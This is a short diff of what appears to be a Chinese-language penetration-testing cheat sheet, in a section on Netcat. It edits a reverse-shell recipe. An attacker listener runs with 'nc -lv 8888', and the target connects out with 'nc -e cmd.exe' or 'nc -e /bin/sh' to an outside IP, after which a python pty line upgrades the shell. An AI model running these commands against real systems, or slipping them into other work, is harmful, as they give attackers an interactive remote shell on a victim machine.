@@ -19,8 +19,8 @@ topics = ["Pentest"]
 
 ### 0x01 Netcat
 ```
-本地：nc -vv -l 8888
-目标：nc -e cmd.exe 10.10.10.10 8888 #nc -e /bin/sh 10.10.10.10 8888
+公网：nc -lv 8888
+目标：nc -e cmd.exe 123.123.123.123 8888 #nc -e /bin/sh 10.10.10.10 8888
 
 #获得交互式的shell：
 在得到shell后执行：python -c "import pty; pty.spawn('/bin/bash')"
